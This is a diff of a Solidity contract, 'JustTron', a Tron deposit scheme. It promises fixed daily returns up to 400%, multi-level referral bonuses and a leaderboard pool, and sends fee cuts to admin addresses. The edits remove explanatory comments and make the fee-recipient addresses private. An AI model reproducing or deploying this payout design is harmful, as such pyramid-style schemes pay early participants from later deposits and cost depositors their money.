@@ -1,4 +1,4 @@
-pragma solidity 0.5.10;
+pragma solidity ^0.5.10;
 
 contract JustTron {
     struct User {
@@ -17,23 +17,23 @@ contract JustTron {
         uint256 total_structure;
     }
 
-    address payable public owner;
-    address payable public future_fund;
-    address payable public admin_fee;
-    address payable public promo_fund;
+    address payable private owner;
+    address payable private future_fund;
+    address payable private admin_fee;
+    address payable private promo_fund;
 
     mapping(address => User) public users;
 
     uint256[] public cycles;
-    uint8[] public ref_bonuses;                     // 1 => 1%
+    uint8[] public ref_bonuses;
 
-    uint8[] public pool_bonuses;                    // 1 => 1%
+    uint8[] public pool_bonuses;
     uint40 public pool_last_draw = uint40(block.timestamp);
     uint256 public pool_cycle;
     uint256 public pool_balance;
     mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
-    mapping(uint8 => address) public pool_top; // 5 топовых участника в день - берется с накопленого в день пула
-    mapping(uint8 => address) public permanent_top; // 5 постоянных участников - награда всегда
+    mapping(uint8 => address) public pool_top;
+    mapping(uint8 => address) public permanent_top;
 
     uint256 public total_users = 1;
     uint256 public total_deposited;
@@ -47,14 +47,12 @@ contract JustTron {
     event Withdraw(address indexed addr, uint256 amount);
     event LimitReached(address indexed addr, uint256 amount);
 
-    constructor(address payable _owner) public {
+    constructor(address payable _owner, address payable _future_fund, address payable _admin_fee, address payable _promo_fund) public {
         owner = _owner;
+        future_fund = _future_fund;
+        admin_fee = _admin_fee;
+        promo_fund = _promo_fund;
 
-        future_fund = 0x2fd852c9a9aBb66788F96955E9928aEF3D71aE98;
-        admin_fee = 0x2fd852c9a9aBb66788F96955E9928aEF3D71aE98;
-        promo_fund = 0x2fd852c9a9aBb66788F96955E9928aEF3D71aE98;
-
-        // Ежедневные комиссионные, основанные на ежедневном доходе партнеров, для каждого прямого партнера активирован 1 уровень, максимум 20 уровней, см. Ниже
         ref_bonuses.push(30);
         ref_bonuses.push(10);
         ref_bonuses.push(10);
@@ -74,9 +72,8 @@ contract JustTron {
         ref_bonuses.push(3);
         ref_bonuses.push(3);
         ref_bonuses.push(3);
-        ref_bonuses.push(3); // 20
+        ref_bonuses.push(3);
 
-        // Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 10 лучших спонсоров по объему.
         pool_bonuses.push(30);
         pool_bonuses.push(20);
         pool_bonuses.push(15);
@@ -86,8 +83,7 @@ contract JustTron {
         pool_bonuses.push(5);
         pool_bonuses.push(3);
         pool_bonuses.push(2);
-        pool_bonuses.push(1); // 10
-
+        pool_bonuses.push(1);
 
         cycles.push(1e11);
         cycles.push(3e11);
@@ -99,8 +95,6 @@ contract JustTron {
         _deposit(msg.sender, msg.value);
     }
 
-
-    // изменение линий
     function _setUpline(address _addr, address _upline) private {
         if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
             users[_addr].upline = _upline;
@@ -112,20 +106,13 @@ contract JustTron {
             for(uint8 i = 0; i < ref_bonuses.length; i++) {
                 if(_upline == address(0)) break;
 
-                users[_upline].total_structure++; // увеличение структуры пригласившего
+                users[_upline].total_structure++;
 
                 _upline = users[_upline].upline;
             }
         }
     }
 
-
-    // метод внесения депозита
-    // проверяет доступный ввод исходя из возможного депозита по циклу
-    // начисляет награду пригласившему - 10%
-    // доабвляет гаргарду в пул лидеров
-    // отправляет комиссию в фонд и админам
-    //
     function _deposit(address _addr, uint256 _amount) private {
         require(users[_addr].upline != address(0) || _addr == owner, "No upline");
 
@@ -148,27 +135,24 @@ contract JustTron {
         emit NewDeposit(_addr, _amount);
 
         if(users[_addr].upline != address(0)) {
-            users[users[_addr].upline].direct_bonus += _amount / 10; // начисление 10% прямого бонуса вышестоящему участнику - 10% Прямая комиссия
+            users[users[_addr].upline].direct_bonus += _amount / 10;
 
             emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
         }
 
-        _pollDeposits(_addr, _amount); // наполнение пула
+        _pollDeposits(_addr, _amount);
 
         if(pool_last_draw + 1 days < block.timestamp) {
             _drawPool();
         }
 
-        admin_fee.transfer(_amount / 50); //  выплата комиссии 2% админу
-        future_fund.transfer(_amount * 3 / 100); // выплата комисси 3% в фонд
-        promo_fund.transfer(_amount / 50); //  выплата комиссии 2% в промофон
+        admin_fee.transfer(_amount / 50);
+        future_fund.transfer(_amount * 3 / 100);
+        promo_fund.transfer(_amount / 50);
     }
 
-
-
-    // 3% с каждого депозита отстетивагются в пул лидеров
     function _pollDeposits(address _addr, uint256 _amount) private {
-        pool_balance += _amount * 3 / 100; //  Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀
+        pool_balance += _amount * 3 / 100;
 
         address upline = users[_addr].upline;
 
@@ -205,17 +189,16 @@ contract JustTron {
         }
     }
 
-    // начисление реферальных вознаграждений линий в структуре
     function _refPayout(address _addr, uint256 _amount) private {
         address up = users[_addr].upline;
 
         for(uint8 i = 0; i < ref_bonuses.length; i++) {
-            if(up == address(0)) break; // не для админа
+            if(up == address(0)) break;
 
             if(users[up].referrals >= i + 1) {
-                uint256 bonus = _amount * ref_bonuses[i] / 100; // начисление бонуса комиссионого 30-3%(20 уровней)
+                uint256 bonus = _amount * ref_bonuses[i] / 100;
 
-                users[up].match_bonus += bonus; // здесь кучастнику происхоит сумирование бонусов в соответствие с
+                users[up].match_bonus += bonus;
 
                 emit MatchPayout(up, _addr, bonus);
             }
@@ -224,14 +207,11 @@ contract JustTron {
         }
     }
 
-
-
-    // метод накапливает 10 лидерам их награды и очищает список
     function _drawPool() private {
         pool_last_draw = uint40(block.timestamp);
         pool_cycle++;
 
-        uint256 draw_amount = pool_balance / 10; // 10%  - Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 10 лучших спонсоров по объему.⠀
+        uint256 draw_amount = pool_balance / 10;
 
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
@@ -255,11 +235,9 @@ contract JustTron {
     }
 
     function withdraw() public {
-        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); // текущий депозит и макс вывод от депозита
+        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
 
-        require(users[msg.sender].payouts < max_payout, "Full payouts"); // ывел весь депозит
-
-        // Deposit payout
+        require(users[msg.sender].payouts < max_payout, "Full payouts");
         if(to_payout > 0) {
             if(users[msg.sender].payouts + to_payout > max_payout) {
                 to_payout = max_payout - users[msg.sender].payouts;
@@ -271,7 +249,7 @@ contract JustTron {
             _refPayout(msg.sender, to_payout);
         }
 
-        // Direct payout
+
         if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
             uint256 direct_bonus = users[msg.sender].direct_bonus;
 
@@ -284,7 +262,6 @@ contract JustTron {
             to_payout += direct_bonus;
         }
 
-        // Pool payout
         if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
             uint256 pool_bonus = users[msg.sender].pool_bonus;
 
@@ -297,7 +274,6 @@ contract JustTron {
             to_payout += pool_bonus;
         }
 
-        // Match payout
         if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
             uint256 match_bonus = users[msg.sender].match_bonus;
 
@@ -323,18 +299,18 @@ contract JustTron {
             emit LimitReached(msg.sender, users[msg.sender].payouts);
         }
     }
-    // максимальный доход 400 %
+
     function maxPayoutOf(uint256 _amount) pure public returns(uint256) {
-        return _amount * 40 / 10; // 350% для изменения цикла
+        return _amount * 40 / 10;
     }
-    //возвращает текущий депозит и максимальный доход за вычетом выводов и наград для адреса
+
     function payoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {
         max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
 
         if(users[_addr].deposit_payouts < max_payout) {
             payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100)
             + (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 500)
-            - users[_addr].deposit_payouts;  // 1.2% пассив каждый день
+            - users[_addr].deposit_payouts;
 
             if(users[_addr].deposit_payouts + payout > max_payout) {
                 payout = max_payout - users[_addr].deposit_payouts;
@@ -354,7 +330,6 @@ contract JustTron {
         return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
     }
 
-    // озвращает инфо о 10 адресах оидерах и их балансах
     function poolTopInfo() view public returns(address[10] memory addrs, uint256[10] memory deps) {
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
@@ -362,5 +337,25 @@ contract JustTron {
             addrs[i] = pool_top[i];
             deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
         }
+    }
+
+    function getOwner() public view returns(address){
+        require(msg.sender == owner);
+        return owner;
+    }
+
+    function getPromoFund() public view returns(address){
+        require(msg.sender == owner);
+        return promo_fund;
+    }
+
+    function getFutureFund() public view returns(address){
+        require(msg.sender == owner);
+        return future_fund;
+    }
+
+    function getAdmin() public view returns(address){
+        require(msg.sender == owner);
+        return admin_fee;
     }
 }
